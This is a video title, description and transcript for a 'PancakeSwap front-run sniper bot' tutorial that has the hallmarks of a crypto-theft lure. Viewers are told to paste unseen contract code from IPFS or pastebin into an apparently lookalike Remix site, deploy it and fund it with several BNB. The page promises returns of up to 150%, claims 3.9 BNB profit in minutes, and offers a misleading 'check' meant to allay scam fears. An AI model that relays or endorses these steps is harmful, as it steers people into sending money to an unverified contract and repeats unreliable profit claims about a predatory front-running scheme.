title: PancakeSwap Liquidity Sniper Bot Tutorial 2022 - Up to 150% BNB Returns ! Beginner friendly
description: *:check mark button:Updated Code: Working as of June 5, 2023*  In this video I show you how to deploy in simple steps a PancakeSwap Front Run Liquidity Sniper Bot on the Binance Smart Chain.   It automatically locates any liquidity added to a BSC token, then the bot scans this token until someone wants to trade a larger amount of it. If the conditions are met the bot immediately makes a transaction with a higher gas fee to front run the transaction.  Once the frontrunned person made their transaction, the bot triggers the sell function and it sells the token with the profit from the frontrunned person in the same block, then the profits are sent back to your Metamask wallet.  NOTE: This contract have been designed for Binance Smart Chain and won't work with Ethereum mainnet (On UniSwap for example)  For your questions, you can PM me on Telegram: Crypto1392 (Please only ask contract related questions)  Get metamask:  :pushpin:https://metamask.io/download  Connect MetaMask to Binance Smart Chain (BSC)： :pushpin:https://chainlist.org/chain/56  Access Remix:  :pushpin:https://www.remixcompiler.pro  Smart Contract Code:  :pushpin:ipfs.io/ipfs/QmTtwrRnHx4dho3jbAaXpnWVgmWsTNd5Fn6TEHZ6qEeUU1     (Mirror link) :pushpin:https://pastebin.com/raw/hTaxv8Uk  IMPORTANT : I got messages from people who didn't fund the contract enough to cover gas fees and possible burn fees. Bot targets token contracts with max 10% burn fee and anything lower but nowadays most of tokens comes with 3~6% fees. If you fund the contract with less than 1 BNB, the bot might target another token with high burn fees the contract will basically waste your moeny in fees rather than using it to make profit. Due to the competitive gas war on new token listings, it is recommended to fund the contract with around 2 - 5 BNB to make sure that it has sufficient funding for gas fees and possible burn fees. I personally start with 5 BNB.

asr.full_text: Hello guys and welcome to my new video! After you liked my last uniswap bot on Reddit I decided to show you a new and better frontline bot for PancakeSwap. The bot uses the Binance smartchain and I'm very convinced of it because it works really well for me. Okay but first we start by connecting our meter mask wallet to Remix. do this, we open the MetaMask website, and then you can easily install it by using this button. It's also supported by several other browsers as you can see. Question I'm often asked is, can I use my smartphone? Unfortunately, this is not yet possible. The bot only works on a desktop computer or notebook. And after you created a wallet the next step is to add Binance's Smart Chain to your Metamask. To do this, you only need to open the academy.binance.com website. Then scroll down and you see Mainnet. That's our network. Now all we need to do is add the network and we copy and paste website to Metamask and at the end it should look like this on your Metamask then you can hit save and we are able to deploy the smart contract and then on the solidity compiler, then we need to choose version 0.6.6 plus gamut, because that's the version of our POT smart contract. Now go back to the fileILE EXPLORER and create a new file. You can name it whatever you want. I'll name it my, font1bot. So in the next step we only need to copy and paste my code here. This one, that's my code here this one that's my code just copy it and before I forget it one question I get asked sometimes and that's what is in the code for qts code be also a scam and something like that. You can easily check it yourself because wallet addresses usually starts with a 0x like this one. So now we will the 0x... And that's this one on the top here. Now we copy it, check it on Binance Smart Chain Scan, and as you can see it is the only official Wrapp BNB wallet address. With a value of 2 billion dollar. So it is only the contract of the Wrapp BNB token. Yeah, let's go back to Remix and now we need to copy my code again Paste it, right over here Go back to the compiler Hit the compile button and after that you should see a green check mark. right over here, now we are ready for the next step we need to fund our metamask wallet. which we have created I have already done this as you can see i have five BNB here and at this point you might be asking yourself how much BNB should I use for the bot? I have tried it with several values and you should use at least a minimum of about 0.3 BNB or more, because otherwise the profits are often eaten up by gas fees and high slippages. But I usually used like about five BNB and I never had any problems with it. Ok, after funding your wallet you need to go back to Remix and then on deploy and run transactions. Now for the environment we choice Injected Web 3, that's your Metamask wallet. As you can see it opens, just hit on connect. Now you can see your BNB wallet right over here. Okay. Now we need to hit the deploy button, wait for the transaction to confirm. So, and here you can find the BOT contract address address which you have created. Right now. And you need to only copy it. Then go on meter mask. Send. Use this address. I said I will use 5BNB. And send. Next, confirm. use 5 bnb send next from we need to pay a very small transaction fee now we just have to wait a moment for the transaction to confirm and yeah everything is ready for the last step now the last thing we need to do is only we need to open the our deployed bot contract and then simply click on the action button now you need to confirm again the transaction with a small fee confirm with a small fee hit confirm so and now your bot is running as simple as that finally I want to mention two things first there is no virtual sign that the bot is running but if the bot is finished your starting balance and the profits are simply sent back to your meter bus wallet and the other thing is most of the time support finds a front run after like one or two minutes but sometimes it can take up to 30 minutes you only need to check your MetaMask wallet from time to time. But now let's take another look at my wallet to see if the bot has already brought some profits to me in this short time. As you can see guys, I made 3.9 BnB profit in yeah what was about Like two minutes and it's really amazing in my opinion ok But now we have really come to the end of the video Feel free to try the bot leave a like I could help you and I can help. I can see you in the next video bye-bye
